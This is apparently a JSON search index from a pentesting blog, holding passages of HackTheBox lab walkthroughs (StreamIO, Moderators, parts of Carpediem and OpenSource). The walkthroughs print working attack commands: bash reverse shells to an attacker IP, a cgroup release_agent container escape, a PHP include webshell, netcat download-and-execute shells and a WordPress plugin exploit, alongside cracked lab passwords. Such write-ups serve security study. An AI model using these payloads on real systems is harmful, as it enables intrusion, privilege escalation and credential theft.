'bash -i &gt;&amp; /dev/tcp/10.10.16.44/443 0&gt;&amp;1'\");?&gt;zero@pio$ $ python3 -m http.server 80Replace the file:ww-data@90c7f522b842:/var/www/html/backdrop$ rm -f index.phpwww-data@90c7f522b842:/var/www/html/backdrop$ wget http://10.10.16.44/index.phpAnd we will get a root connection:root@90c7f522b842:/var/www/html/backdrop# whoami\trootThis article talk about how to escape from a privileged docker container. Create the following script and send it to the target:mkdir /dev/shm/privescmount -t cgroup -o rdma cgroup /dev/shm/privescmkdir /dev/shm/privesc/xecho 1 &gt; /dev/shm/privesc/x/notify_on_releasehost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`echo \"$host_path/cmd\" &gt; /dev/shm/privesc/release_agentecho '#!/bin/bash' &gt; /cmdecho \"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.44/443 0&gt;&amp;1'\" &gt;&gt; /cmdchmod a+x /cmdbash -c \"echo \\$\\$ &gt; /dev/shm/privesc/x/cgroup.procs\"Execute the script in the container with a netcat open:root@90c7f522b842:~# unshare -UrmC bashwget http://10.10.16.44/script.shchmod +x script.sh./script.sh\tzero@pio$ nc -lvnp 443\tlistening on [any] 443 ...\tconnect to [10.10.16.44] from (UNKNOWN) [10.10.11.167] 59580\troot@carpediem:/# whoami\t\troot" }, { "title": "HTB | StreamIO", "url": "/pentesting/htb/machines/streamio", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, medium, machines", "date": "2022-08-31 00:00:00 +0200", "snippet": "FingerprintThe nmap show that:Nmap scan report for 10.10.11.158Host is up (0.063s latency).Not shown: 987 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0| http-methods: |_ Potentially risky methods: TRACE|_http-title: IIS Windows Server88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-08-31 23:24:32Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)| tls-alpn: |_ http/1.1|_http-title: Not Found| ssl-cert: Subject: commonName=streamIO/countryName=EU| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb| Not valid before: 2022-02-22T07:03:28|_Not valid after: 2022-03-24T07:03:28|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: 2022-08-31T23:25:20+00:00; +7h00m01s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2022-08-31T23:24:43|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled and required|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00sIn the port 443 we can found a login as https://streamio.htb/login.php.FootholdWe can try fuzzing in the page, finding the following:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'https://streamio.htb/FUZZ'\tADMIN [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 74ms]\tAdmin [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 67ms]\tImages [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 62ms]\tadmin [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 72ms]\tcss [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 76ms]\tfavicon.ico [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 77ms]\tfonts [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 66ms]\timages [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 77ms]\tindex.php [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 76ms]\tjs [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 79ms]If we try sqlmap we can get a user table with password:zero@pio$ sqlmap -u 'https://streamio.htb/login.php' --data 'username=test&amp;password=test' --batch --dumpWe will get the following table:+----+----------+----------------+---------------------------------------+| id | is_staff | username | password |+----+----------+----------------+---------------------------------------+| 3 | 1 | James | c660060492d9edcaa8332d89c99c9239 || 4 | 1 | Theodore | 925e5408ecb67aea449373d668b7359e || 5 | 1 | Samantha | 083ffae904143c4796e464dac33c1f7d || 6 | 1 | Lauren | 08344b85b329d7efd611b7a7743e8a09 || 7 | 1 | William | d62be0dc82071bccc1322d64ec5b6c51 || 8 | 1 | Sabrina | f87d3c0d6c8fd686aacc6627f1f493a5 || 9 | 1 | Robert | f03b910e2bd0313a23fdd7575f34a694 || 10 | 1 | Thane | 3577c47eb1e12c8ba021611e1280753c || 11 | 1 | Carmon | 35394484d89fcfdb3c5e447fe749d213 || 12 | 1 | Barry | 54c88b2dbd7b1a84012fabc1a4c73415 || 13 | 1 | Oliver | fd78db29173a5cf701bd69027cb9bf6b || 14 | 1 | Michelle | b83439b16f844bd6ffe35c02fe21b3c0 || 15 | 1 | Gloria | 0cfaaaafb559f081df2befbe66686de0 || 16 | 1 | Victoria | b22abb47a02b52d5dfa27fb0b534f693 || 17 | 1 | Alexendra | 1c2b3d8270321140e5153f6637d3ee53 || 18 | 1 | Baxter | 22ee218331afd081b0dcd8115284bae3 || 19 | 1 | Clara | ef8f3d30a856cf166fb8215aca93e9ff || 20 | 1 | Barbra | 3961548825e3e21df5646cafe11c6c76 || 21 | 1 | Lenord | ee0b8a0937abd60c2882eacb2f8dc49f || 22 | 1 | Austin | 0049ac57646627b8d7aeaccf8b6a936f || 23 | 1 | Garfield | 8097cedd612cc37c29db152b6e9edbd3 || 24 | 1 | Juliette | 6dcd87740abb64edfa36d170f0d5450d || 25 | 1 | Victor | bf55e15b119860a6e6b5a164377da719 || 26 | 1 | Lucifer | 7df45a9e3de3863807c026ba48e55fb3 || 27 | 1 | Bruno | 2a4e2cf22dd8fcb45adcb91be1e22ae8 || 28 | 1 | Diablo | ec33265e5fc8c2f1b0c137bb7b3632b5 || 29 | 1 | Robin | dc332fb5576e9631c9dae83f194f8e70 || 30 | 1 | Stan | 384463526d288edcc95fc3701e523bc7 || 31 | 1 | yoshihide | b779ba15cedfd22a023c4d8bcf5f2332 || 33 | 0 | admin | 665a50ac9eaa781e4f7f04199db97a11 |+----+----------+----------------+---------------------------------------+If we try offline cracking (hashcat 0 mode) them we can found a bunch of credentials:##123a8j8w5123## (Lauren)!!sabrina$ (Sabrina)highschoolmusical (Thane)$hadoW (Barry)!?Love?!123 (Michelle)!5psycho8! (Victoria)%$clara (Clara)physics69i (Lenord)$3xybitch (Juliette)$monique$1991$ (Bruno)66boysandgirls.. (yoshihide)paddpadd (admin)But just yoshihide user will work in the login. This user can access the /admin page. We found there a bunch of url parameters. We can fuzz by them:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -H 'Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d' -fs 1678\tdebug [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 55ms]\tmovie [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 70ms]\tstaff [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 63ms]\tuser [Status: 200, Size: 3557, Words: 389, Lines: 111, Duration: 62ms]The debug parameter doesn’t appear in the admin page but it is a valid one. We can start fuzzing by files, because it is a debugger:zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt -u 'https://streamio.htb/admin/?debug=FUZZ' -H 'Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d' -fs 1712\tindex.php [Status: 200, Size: 1693, Words: 93, Lines: 47, Duration: 61ms]\tmaster.php [Status: 200, Size: 344209, Words: 17997, Lines: 11207, Duration: 110ms]We see that we can get those file searching them.zero@pio$ curl -s -k \"https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php\" -H 'Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d' | grep developers | awk '{print $6}' | base64 -d\t$connection = array(\"Database\"=&gt;\"STREAMIO\", \"UID\" =&gt; \"db_admin\", \"PWD\" =&gt; 'B1@hx31234567890');\t$handle = sqlsrv_connect('(local)',$connection);The master.php file includes other files, so we can pass a reverse shell. Encrypt it in base64 and send it as:zero@pio$ curl -s -k --data-binary \"include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7\" -H 'Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d' \"https://streamio.htb/admin/?debug=master.php&amp;cmd=whoami\"\t&lt;/form&gt;\tstreamio\\yoshihide\t &lt;/div&gt;\t &lt;/center&gt;\t&lt;/body&gt;Upload netcat and start a reverse shell:zero@pio$ python3 -m http.serverzero@pio$ curl -s -k --data-binary \"include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7\" -H \"Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d\" \"https://streamio.htb/admin/?debug=master.php&amp;cmd=curl+10.10.16.44/nc.exe+-o+C:\\\\ProgramData\\\\netcat.exe\" &amp;&gt;/dev/nullzero@pio$ curl -s -k --data-binary \"include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7\" -H \"Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d\" \"https://streamio.htb/admin/?debug=master.php&amp;cmd=cmd+/c+C:\\\\ProgramData\\\\netcat.exe+-e+powershell+10.10.16.44+443\" &amp;&gt;/dev/nullAnd now we have a connection.Privilege EscalationStart a chisel connection to access the sql server:zero@pio$ chisel server --reverse --port 8000PS C:\\ProgramData&gt; .\\chisel.exe client 10.10.16.44:8000 R:1433:127.0.0.1:1433Now make a connection with the previous founded credentials:zero@pio$ sqsh -S 127.0.0.1:1433 -U db_admin -P B1@hx31234567890 -D streamio_backupWe can found there some credentials:1&gt; select username,password from users;2&gt; go username password--------------- ---------------------------------- nikk37 389d14cb8e4e9b94b137deb1caf0612a yoshihide b779ba15cedfd22a023c4d8bcf5f2332 James c660060492d9edcaa8332d89c99c9239 Theodore 925e5408ecb67aea449373d668b7359e Samantha 083ffae904143c4796e464dac33c1f7d Lauren 08344b85b329d7efd611b7a7743e8a09 William d62be0dc82071bccc1322d64ec5b6c51 Sabrina f87d3c0d6c8fd686aacc6627f1f493a5Cracked them and get:get_dem_girls2@yahoo.com (nikk37)66boysandgirls.. (yoshihide)##123a8j8w5123## (Lauren)!!sabrina$ (Sabrina)We can start trying them with crackmapexec:zero@pio$ crackmapexec winrm 10.10.11.158 -u users -p passwords\tWINRM 10.10.11.158 5985 NONE [+] None\\nikk37:get_dem_girls2@yahoo.com (Pwn3d!We can make the first connection to the system with evil-winrm :zero@pio$ evil-winrm -i 10.10.11.158 -u nikk37 -p get_dem_girls2@yahoo.comInside, winpeas detect some mozilla credentials:Firefox credentials file exists at C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release\\key4.dbWe can use this tool to get it in cleartext:admin:JDg0dd1s@d0p3cr3@t0rnikk37:n1kk1sd0p3t00yoshihide:paddpadd@12JDgodd:password@12We can now use PowerView to add the user to the group CoreStaff, which has admin privileges.*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&gt; upload PowerView.ps1*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&gt; Import-Module .\\PowerView.ps1*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&gt; $Password = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&gt; $Cred = New-Object System.Management.Automation.PSCredential('StreamIO\\JDGodd', $Password)*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity \"Core Staff\" -PrincipalIdentity \"StreamIO\\JDGodd\"*Evil-WinRM* PS C:\\Users\\nikk37\\Documents&gt; Add-DomainGroupMember -Identity \"Core Staff\" -Members \"StreamIO\\JDGodd\" -Credential $CredNow use LAPSdumper to generate a temporal credential and connect to it:zero@pio$ python3 laps.py -u JDGodd -p JDg0dd1s@d0p3cr3@t0r -d streamio.htbUse it with evil-winrm to connect." }, { "title": "HTB | Moderators", "url": "/pentesting/htb/machines/moderators", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, hard, machines", "date": "2022-08-31 00:00:00 +0200", "snippet": "FingerprintThe nmap gives us:22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 39:03:16:06:11:30:a0:b0:c2:91:79:88:d3:93:1b:3e (RSA)| 256 51:94:5c:59:3b:bd:bc:b6:26:7a:ef:83:7f:4c:ca:7d (ECDSA)|_ 256 a5:6d:03:fa:6c:f5:b9:4a:a2:a1:b6:bd:bc:60:42:31 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: ModeratorsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelIn the webserver we found the following path /blog.php with some other links like /reports.php?report=8121 . We can fuzz this reports:zero@pio$ wfuzz -c -z range,0-9999 -u \"http://10.10.11.173/reports.php?report=FUZZ\" --hh 7888We can see between the reports. In the 9798 we found:The log path is the report in md5, so we can start testing for others log we can visualize:zero@pio$ wfuzz -c -z range,0-9999,md5 -u \"http://10.10.11.173/logs/FUZZ/\" --hh 274\t000002590: 200 0 L 0 W 0 Ch \"743c41a921516b04afde48bb48e28ce6\" \t000003479: 200 0 L 0 W 0 Ch \"b071cfa81605a94ad80cfa2bbc747448\" \t000004222: 200 0 L 0 W 0 Ch \"74d90aafda34e6060f9e8433962d14fd\" \t000007613: 200 0 L 0 W 0 Ch \"ce5d75028d92047a9ec617acb9c34ce6\" \t000008122: 200 0 L 0 W 0 Ch \"afecc60f82be41c1b52f6705ec69e0f1\" \t000009799: 200 0 L 0 W 0 Ch \"e21cece511f43a5cb18d4932429915ed\"All of them are empty. We can fuzz in them, founding a pdf file in /logs/743c41a921516b04afde48bb48e28ce6/logs.pdf:We can travel to that directory, founding a place to upload files.FootholdWe can send a basic PHP reverse shell, but it won’t work. Seems like there are some kind of filter. We can try with weevely to generate a payload as:zero@pio$ weevely generate shell shell.pdf.phpModify the headers in burp, so it appears as a pdf:Content-Disposition: form-data; name=\"pdfFile\"; filename=\"shell.pdf.php\"Content-Type: application/pdf%PDF-1.5&lt;content&gt;%%EOFExecute weevely:zero@pio$ weevely 'http://10.10.11.173/logs/uploads/shell.pdf.php' shellweevely&gt; whoami\twww-datawww-data@moderators:/var/www/html/logs/uploads $Privilege EscalationWe found two users in home, john and lexi. We can see that the port 8080 is open locally, so we can try using chisel to get it:zero@pio$ chisel server --reverse --port 8000And in the target:www-data@moderators:/var/www/html/logs/uploads $ ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080We found a Wordpress there, vulnerable to this exploit. Start by creating a user folder:www-data@moderators:~/html/logs/uploads$ mkdir userwww-data@moderators:~/html/logs/uploads/user$ cat wp-load.php &lt;?php system(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.44/443 0&gt;&amp;1'\"); ?&gt;Using the plugin call the exploit while openning a netcat:zero@pio$ sudo netcat -lvnp 443Listening on 0.0.0.0 443zero@pio$ curl \"http://localhost:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/user/\"Now we are as lexi user, we can even get the RSA for a more stable shell. Also, we can change the port forwarding using ssh:zero@pio$ ssh -L 8080:localhost:8080 -i rsa_lexi lexi@10.10.11.173Searching for creds in the system we found a file. Inspecting it we get:lexi@moderators:/opt/site.new$ cat wp-config.php\t/** MySQL database username */\tdefine( 'DB_USER', 'wordpressuser' );\t\t/** MySQL database password */\tdefine( 'DB_PASSWORD', 'wordpresspassword123!!' );We found in the MySQL the password, but it is encrypted. We can try changing it to password:lexi@moderators:~$ mysql -Dwordpress -uwordpressuser -p'wordpresspassword123!!'MariaDB [wordpress]&gt; UPDATE `wp_users` SET `user_pass` = '$P$BIsDcvvyUHRF.QKXlJzhA9.kgCsuxL/' WHERE user_login = 'admin';Also, we need to add moderators.htb to the /etc/hosts to make it work. If we go to /wp-admin it will redirect us in moderators.htb. It should look like:127.0.0.1 localhost moderators.htbThe credentials admin:password will work now. There we can find a RSA for the user john. From that user we have access to a new folder with a vdi file:john@moderators:~/stuff/VBOX$ ls -l\ttotal 118792\t-rwxr-xr-x 1 john john 5705 Sep 18 2020 2019-08-01.vbox\t-rwxr-xr-x 1 john john 121634816 Sep 18 2020 2019.vdiWe will use this tool to crack the password.zero@pio$ python3 pyvboxdie-cracker.py -v 2019-08-01.vbox -d ./wordlist.txt\t[*] Encrypted drive found : F:/2019.vdi\t[*] KeyStore information...\t Algorithm = AES-XTS256-PLAIN64\t Hash = PBKDF2-SHA256\t Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f\t\t[*] Starting bruteforce...\t 51 password tested...\t\t[*] Password Found = computerWe need to adapt the vbox file to:&lt;?xml version=\"1.0\"?&gt;&lt;!--** DO NOT EDIT THIS FILE.** If you make changes to this file while any VirtualBox related application** is running, your changes will be overwritten later, without taking effect.** Use VBoxManage or the VirtualBox Manager GUI to make changes.--&gt;&lt;VirtualBox xmlns=\"http://www.virtualbox.org/\" version=\"1.16-windows\"&gt; &lt;Machine uuid=\"{528b3540-b8be-4677-b43f-7f4969137747}\" name=\"Moderator 1\" OSType=\"Ubuntu_64\" snapshotFolder=\"Snapshots\" lastStateChange=\"2022-08-11T19:20:46Z\"&gt; &lt;MediaRegistry&gt; &lt;HardDisks&gt; &lt;HardDisk uuid=\"{12b147da-5b2d-471f-9e32-a32b1517ff4b}\" location=\"./2019.vdi\" format=\"VDI\" type=\"Normal\"&gt; &lt;Property name=\"CRYPT/KeyId\" value=\"Moderator 1\"/&gt; &lt;Property name=\"CRYPT/KeyStore\" value=\"U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAADssBk3IXYOVlXkLWlDd8JCJ8ZUN8FC&amp;#13;&amp;#10;kVQY8Ovl9vXMMyAAAABu5KwY/KgMH20LHptIADnZJ6gRrgSFLm+s6eJEaJx+ziBO&amp;#13;&amp;#10;AAByl/CysecMVxqIA8QKkYqCcCT+RiMz7PJCBnJ+/oGFI2DqAABAAAAAKGFz0b7a&amp;#13;&amp;#10;q8cFTdpSCXUCgvz+yFWcIi1i2jYow1/CS0CEEATdrtbMxzzANgoenuThAceBWSUQ&amp;#13;&amp;#10;FqJ4CioY8Qm3BA==\"/&gt; &lt;/HardDisk&gt; &lt;/HardDisks&gt; &lt;/MediaRegistry&gt; &lt;ExtraData&gt; &lt;ExtraDataItem name=\"GUI/LastCloseAction\" value=\"PowerOff\"/&gt; &lt;ExtraDataItem name=\"GUI/LastGuestSizeHint\" value=\"2560,1335\"/&gt; &lt;ExtraDataItem name=\"GUI/LastNormalWindowPosition\" value=\"0,23,640,480,max\"/&gt; &lt;/ExtraData&gt; &lt;Hardware&gt; &lt;CPU count=\"2\"&gt; &lt;PAE enabled=\"false\"/&gt; &lt;LongMode enabled=\"true\"/&gt; &lt;X2APIC enabled=\"true\"/&gt; &lt;HardwareVirtExLargePages enabled=\"true\"/&gt; &lt;/CPU&gt; &lt;Memory RAMSize=\"2048\"/&gt; &lt;HID Pointing=\"USBTablet\"/&gt; &lt;Boot&gt; &lt;Order position=\"1\" device=\"Floppy\"/&gt; &lt;Order position=\"2\" device=\"HardDisk\"/&gt; &lt;Order position=\"3\" device=\"DVD\"/&gt; &lt;Order position=\"4\" device=\"None\"/&gt; &lt;/Boot&gt; &lt;Display controller=\"VMSVGA\" VRAMSize=\"128\" accelerate3D=\"true\"/&gt; &lt;BIOS&gt; &lt;IOAPIC enabled=\"true\"/&gt; &lt;SmbiosUuidLittleEndian enabled=\"true\"/&gt; &lt;/BIOS&gt; &lt;USB&gt; &lt;Controllers&gt; &lt;Controller name=\"OHCI\" type=\"OHCI\"/&gt; &lt;Controller name=\"EHCI\" type=\"EHCI\"/&gt; &lt;/Controllers&gt; &lt;/USB&gt; &lt;Network&gt; &lt;Adapter slot=\"0\" enabled=\"true\" MACAddress=\"08002799F7EC\" type=\"82540EM\"&gt; &lt;NAT/&gt; &lt;/Adapter&gt; &lt;/Network&gt; &lt;AudioAdapter codec=\"AD1980\" driver=\"DirectSound\" enabled=\"true\" enabledIn=\"false\"/&gt; &lt;RTC localOrUTC=\"UTC\"/&gt; &lt;Clipboard/&gt; &lt;GuestProperties&gt; &lt;GuestProperty name=\"/VirtualBox/GuestAdd/HostVerLastChecked\" value=\"6.1.34\" timestamp=\"1657117437893678100\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestAdd/Revision\" value=\"150636\" timestamp=\"1657117380950198406\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestAdd/Version\" value=\"6.1.34\" timestamp=\"1657117380950198404\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestAdd/VersionExt\" value=\"6.1.34\" timestamp=\"1657117380950198405\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/MAC\" value=\"08002799F7EC\" timestamp=\"1657117380952151105\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/Name\" value=\"enp0s3\" timestamp=\"1657117380952151107\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/Status\" value=\"Up\" timestamp=\"1657117380952151106\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/V4/Broadcast\" value=\"10.0.2.255\" timestamp=\"1657117380952151103\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/V4/IP\" value=\"10.0.2.15\" timestamp=\"1657117380952151102\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/0/V4/Netmask\" value=\"255.255.255.0\" timestamp=\"1657117380952151104\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/Net/Count\" value=\"1\" timestamp=\"1657117646084736900\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/OS/Product\" value=\"Linux\" timestamp=\"1657117380950198400\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/OS/Release\" value=\"5.15.0-40-generic\" timestamp=\"1657117380950198401\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/GuestInfo/OS/Version\" value=\"#43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022\" timestamp=\"1657117380950198402\" flags=\"\"/&gt; &lt;GuestProperty name=\"/VirtualBox/HostInfo/DekMissing\" value=\"1\" timestamp=\"1660245560293252500\" flags=\"RDONLYGUEST\"/&gt; &lt;GuestProperty name=\"/VirtualBox/HostInfo/GUI/LanguageID\" value=\"es_ES\" timestamp=\"1660245647071532000\" flags=\"\"/&gt; &lt;/GuestProperties&gt; &lt;/Hardware&gt; &lt;StorageControllers&gt; &lt;StorageController name=\"AHCI\" type=\"AHCI\" PortCount=\"3\" useHostIOCache=\"false\" Bootable=\"true\" IDE0MasterEmulationPort=\"0\" IDE0SlaveEmulationPort=\"1\" IDE1MasterEmulationPort=\"2\" IDE1SlaveEmulationPort=\"3\"&gt; &lt;AttachedDevice type=\"HardDisk\" hotpluggable=\"false\" port=\"0\" device=\"0\"&gt; &lt;Image uuid=\"{12b147da-5b2d-471f-9e32-a32b1517ff4b}\"/&gt; &lt;/AttachedDevice&gt; &lt;/StorageController&gt; &lt;/StorageControllers&gt; &lt;VideoCapture options=\"vc_enabled=true,ac_enabled=true,ac_profile=med\" fps=\"25\"/&gt; &lt;/Machine&gt;&lt;/VirtualBox&gt;Now import the machine in virtualbox, with the guest additions installed and the encryption founded. Mounting the machine will lead in an error:zero@pio$ sudo mount /dev/sda /tmpmount: /tmp: unknown filesystem type 'crypto_LUKS'We must use this tool to a successful with the previous wordlist:zero@pio$ sudo ./bruteforce-luks-static-linux-amd64 -f wordlist.txt /dev/sda# The password is: abc123We will see a file called distro_update.sh with the following information:echo \"\"echo \"Installing updates..\"passwd='$_THE_best_Sysadmin_Ever_'echo $passwd|sudo apt-get updateecho \"Upgrading...\"echo $passwd|sudo apt-get -y upgradeWith the john password we will see that john has all the sudo permission:john@moderators:~/stuff/VBOX$ sudo -l[sudo] password for john: Matching Defaults entries for john on moderators: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser john may run the following commands on moderators: (root) ALL" }, { "title": "HTB | OpenSource", "url": "/pentesting/htb/machines/opensource", "categories": "Pentesting, HackTheBox", "tags": "htb, linux, easy, machines", "date": "2022-08-29 00:00:00 +0200", "snippet": "FingerprintingThe nmap show:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)| 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)|_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)80/tcp open http Werkzeug/2.1.2 Python/3.10.3| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Server: Werkzeug/2.1.2 Python/3.10.3| Date: Mon, 29 Aug 2022 21:26:33 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 5316| Connection: close| &lt;html lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"UTF-8\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;| &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;| &lt;script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/vendor/popper/popper.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/js/ie10-viewport-bug-workaround.js\"&gt;&lt;/script&gt;| &lt;link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/&gt;| &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/&gt;| &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/&gt;| &lt;link rel=| HTTPOptions: | HTTP/1.1 200 OK| Server: Werkzeug/2.1.2 Python/3.10.3| Date: Mon, 29 Aug 2022 21:26:33 GMT| Content-Type: text/html; charset=utf-8| Allow: OPTIONS, GET, HEAD| Content-Length: 0| Connection: close| RTSPRequest: | &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"| \"http://www.w3.org/TR/html4/strict.dtd\"&gt;| &lt;html&gt;| &lt;head&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;| &lt;title&gt;Error response&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;Error response&lt;/h1&gt;| &lt;p&gt;Error code: 400&lt;/p&gt;| &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;| &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;| &lt;/body&gt;|_ &lt;/html&gt;|_http-title: upcloud - Upload files for Free!|_http-server-header: Werkzeug/2.1.2 Python/3.10.33000/tcp filtered ppp1 service unrecognized despite returning data.Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelIf we go to the webpage we can download a zip with the content of a program. We can see a .git folder. Let’s see the branches:zero@pio$ git branch \t dev\t* publiczero@pio$ git log dev \tcommit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)\tAuthor: gituser &lt;gituser@local&gt;\tDate: Thu Apr 28 13:47:24 2022 +0200\t\t ease testing\t\tcommit be4da71987bbbc8fae7c961fb2de01ebd0be1997\tAuthor: gituser &lt;gituser@local&gt;\tDate: Thu Apr 28 13:46:54 2022 +0200\t\t added gitignore\t\tcommit a76f8f75f7a4a12b706b0cf9c983796fa1985820\tAuthor: gituser &lt;gituser@local&gt;\tDate: Thu Apr 28 13:46:16 2022 +0200\t\t updated\t\tcommit ee9d9f1ef9156c787d53074493e39ae364cd1e05\tAuthor: gituser &lt;gituser@local&gt;\tDate: Thu Apr 28 13:45:17 2022 +0200\t\t initialWe can start searching in each one with git show &lt;commit&gt; :zero@pio$ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820\tgit show a76f8f75f7a4a12b706b0cf9c983796fa1985820\tcommit a76f8f75f7a4a12b706b0cf9c983796fa1985820\tAuthor: gituser &lt;gituser@local&gt;\tDate: Thu Apr 28 13:46:16 2022 +0200\t\t updated\t\tdiff --git a/app/.vscode/settings.json 